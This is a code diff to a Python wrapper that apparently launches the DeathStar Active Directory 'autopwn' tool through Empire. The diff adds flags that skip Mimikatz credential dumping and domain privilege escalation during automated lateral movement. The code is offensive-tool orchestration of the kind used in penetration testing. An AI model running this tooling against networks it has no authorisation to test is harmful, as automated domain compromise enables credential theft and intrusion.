@@ -42,6 +42,13 @@ def main():
     parser.add_argument('--no-deathstar', help='Disable Deathstar autopwn',
                         action='store_true', dest='disable_deathstar'
     )
+    parser.add_argument('--no-mimikatz', help='Do not use Mimikatz during lateral movement (default: False)',
+                        action='store_true', dest='disable_mimikatz'
+    )
+    parser.add_argument('--no-domain-privesc', help='Do not use domain privilege escalation techniques (default: False)',
+                        action='store_true', dest='disable_domain_privesc'
+    )
+
     args = parser.parse_args()
     
     host_ip = args.host_ip
@@ -49,6 +56,8 @@ def main():
     empire_lport = args.port
     disable_relay = args.disable_relay
     disable_deathstar = args.disable_deathstar
+    disable_mimikatz = args.disable_mimikatz
+    disable_domain_privesc = args.disable_domain_privesc
     
     if not host_ip:
         host_ip = raw_input("\nEnter interface IP address to listen on: ")
@@ -77,6 +86,10 @@ def main():
     
     print("\nLaunching DeathStar (waiting 5s)...")
     command = 'cd /opt/DeathStar && python3 ./DeathStar.py -u %s -p %s -lip %s -lp %s' % (empire_user, empire_pass, host_ip, empire_lport)
+    if disable_mimikatz:
+        command += " --no-mimikatz"
+    if disable_domain_privesc:
+        command+= " --no-domain-privesc"
     #tmux_window.split_window(shell=command)
     tmux_pane = tmux_window.split_window()
     tmux_pane.send_keys(command)
